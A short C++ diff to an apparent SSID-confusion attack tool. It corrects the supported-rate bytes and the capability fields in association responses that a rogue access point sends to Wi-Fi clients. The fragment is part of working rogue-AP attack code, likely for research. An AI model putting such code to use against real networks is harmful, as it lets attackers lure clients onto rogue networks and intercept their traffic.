@@ -70,8 +70,8 @@ FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr2, const P
 FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11, const frame_raw_t &raw) {
 	using R = Dot11ManagementFrame::rates_type::value_type;
 	static const Dot11ManagementFrame::rates_type rates = {
-		static_cast<R>(82),
-		static_cast<R>(84),
+		static_cast<R>(0x82), // basic 1 Mbps
+		static_cast<R>(0x84), // basic 2 Mbps
 		static_cast<R>(139),
 		static_cast<R>(150),
 		static_cast<R>(36),
@@ -82,7 +82,7 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot1
 	auto fill_resp = [&](auto &resp, const auto &req) {
 		resp.addr3(rogue_ap.get(SK::mac));
 		resp.status_code(0);
-		resp.capabilities() = req.capabilities();
+		resp.capabilities() = probe_resp->capabilities(); // AP caps (ESS=1, Privacy=1), not STA caps
 		resp.aid(1);
 		resp.supported_rates(rates);
 		send_to_rogue(resp);
